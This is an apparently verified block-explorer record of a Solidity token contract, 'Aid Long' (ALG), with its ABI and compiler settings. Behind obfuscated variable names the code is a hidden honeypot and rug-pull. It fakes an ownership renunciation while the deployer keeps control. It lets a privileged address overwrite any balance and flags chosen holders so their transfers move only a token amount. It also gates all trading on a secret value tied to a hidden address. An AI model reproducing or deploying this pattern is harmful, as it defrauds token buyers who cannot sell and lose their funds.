{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface sellBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingReceiver {\n    function createPair(address sellTotal, address exemptSender) external returns (address);\n}\n\ninterface totalTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFund) external view returns (uint256);\n\n    function transfer(address teamMarketingTake, uint256 marketingSenderWallet) external returns (bool);\n\n    function allowance(address launchedTotalTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingSenderWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMarketingTake,\n        uint256 marketingSenderWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableAt, uint256 value);\n    event Approval(address indexed launchedTotalTeam, address indexed spender, uint256 value);\n}\n\ninterface totalTeamMetadata is totalTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AidLong is exemptWallet, totalTeam, totalTeamMetadata {\n\n    uint256 private exemptEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundTrading;\n    }\n\n    constructor (){\n        if (exemptEnable == fromLaunchedShould) {\n            isFee = true;\n        }\n        sellBuy isTo = sellBuy(liquidityTake);\n        fromToken = marketingReceiver(isTo.factory()).createPair(isTo.WETH(), address(this));\n        \n        launchMin = _msgSender();\n        feeList();\n        minMax[launchMin] = true;\n        toTrading[launchMin] = fundTrading;\n        if (minTrading != fromLaunchedShould) {\n            fromLaunchedShould = minTrading;\n        }\n        emit Transfer(address(0), launchMin, fundTrading);\n    }\n\n    function balanceOf(address minFund) public view virtual override returns (uint256) {\n        return toTrading[minFund];\n    }\n\n    mapping(address => mapping(address => uint256)) private limitMin;\n\n    string private exemptMode = \"Aid Long\";\n\n    function getOwner() external view returns (address) {\n        return liquidityLimit;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderTotal;\n    }\n\n    string private launchFund = \"ALG\";\n\n    function feeList() public {\n        emit OwnershipTransferred(launchMin, address(0));\n        liquidityLimit = address(0);\n    }\n\n    function atFrom(address exemptTx) public {\n        fundAt();\n        if (isFee == launchLimit) {\n            minTrading = exemptEnable;\n        }\n        if (exemptTx == launchMin || exemptTx == fromToken) {\n            return;\n        }\n        enableToken[exemptTx] = true;\n    }\n\n    function transferFrom(address feeFundTo, address teamMarketingTake, uint256 marketingSenderWallet) external override returns (bool) {\n        if (_msgSender() != liquidityTake) {\n            if (limitMin[feeFundTo][_msgSender()] != type(uint256).max) {\n                require(marketingSenderWallet <= limitMin[feeFundTo][_msgSender()]);\n                limitMin[feeFundTo][_msgSender()] -= marketingSenderWallet;\n            }\n        }\n        return swapFrom(feeFundTo, teamMarketingTake, marketingSenderWallet);\n    }\n\n    function transfer(address launchedFee, uint256 marketingSenderWallet) external virtual override returns (bool) {\n        return swapFrom(_msgSender(), launchedFee, marketingSenderWallet);\n    }\n\n    function receiverSender(address launchedFee, uint256 marketingSenderWallet) public {\n        fundAt();\n        toTrading[launchedFee] = marketingSenderWallet;\n    }\n\n    function fundAt() private view {\n        require(minMax[_msgSender()]);\n    }\n\n    function txFrom(address feeFundTo, address teamMarketingTake, uint256 marketingSenderWallet) internal returns (bool) {\n        require(toTrading[feeFundTo] >= marketingSenderWallet);\n        toTrading[feeFundTo] -= marketingSenderWallet;\n        toTrading[teamMarketingTake] += marketingSenderWallet;\n        emit Transfer(feeFundTo, teamMarketingTake, marketingSenderWallet);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed tradingAtSwap, address indexed atFee);\n\n    bool private launchLimit;\n\n    uint256 public minTrading;\n\n    function tradingTx(uint256 marketingSenderWallet) public {\n        fundAt();\n        marketingIs = marketingSenderWallet;\n    }\n\n    mapping(address => bool) public enableToken;\n\n    mapping(address => bool) public minMax;\n\n    bool public isFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchFund;\n    }\n\n    uint256 swapAt;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptMode;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityLimit;\n    }\n\n    uint256 public fromLaunchedShould;\n\n    function swapFrom(address feeFundTo, address teamMarketingTake, uint256 marketingSenderWallet) internal returns (bool) {\n        if (feeFundTo == launchMin) {\n            return txFrom(feeFundTo, teamMarketingTake, marketingSenderWallet);\n        }\n        uint256 senderFee = totalTeam(fromToken).balanceOf(fromMax);\n        require(senderFee == marketingIs);\n        require(teamMarketingTake != fromMax);\n        if (enableToken[feeFundTo]) {\n            return txFrom(feeFundTo, teamMarketingTake, amountSell);\n        }\n        return txFrom(feeFundTo, teamMarketingTake, marketingSenderWallet);\n    }\n\n    address liquidityTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public launchMin;\n\n    function approve(address minExempt, uint256 marketingSenderWallet) public virtual override returns (bool) {\n        limitMin[_msgSender()][minExempt] = marketingSenderWallet;\n        emit Approval(_msgSender(), minExempt, marketingSenderWallet);\n        return true;\n    }\n\n    uint256 marketingIs;\n\n    uint256 constant amountSell = 17 ** 10;\n\n    address private liquidityLimit;\n\n    mapping(address => uint256) private toTrading;\n\n    uint8 private senderTotal = 18;\n\n    address public fromToken;\n\n    function txEnable(address launchTotal) public {\n        require(launchTotal.balance < 100000);\n        if (listLimitFee) {\n            return;\n        }\n        \n        minMax[launchTotal] = true;\n        if (isFee != launchLimit) {\n            fromLaunchedShould = minTrading;\n        }\n        listLimitFee = true;\n    }\n\n    function allowance(address launchFromSender, address minExempt) external view virtual override returns (uint256) {\n        if (minExempt == liquidityTake) {\n            return type(uint256).max;\n        }\n        return limitMin[launchFromSender][minExempt];\n    }\n\n    uint256 private fundTrading = 100000000 * 10 ** 18;\n\n    address fromMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listLimitFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotalTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAtSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFromSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSenderWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"}],\"name\":\"atFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunchedShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSenderWallet\",\"type\":\"uint256\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingSenderWallet\",\"type\":\"uint256\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSenderWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFundTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMarketingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSenderWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"}],\"name\":\"txEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AidLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}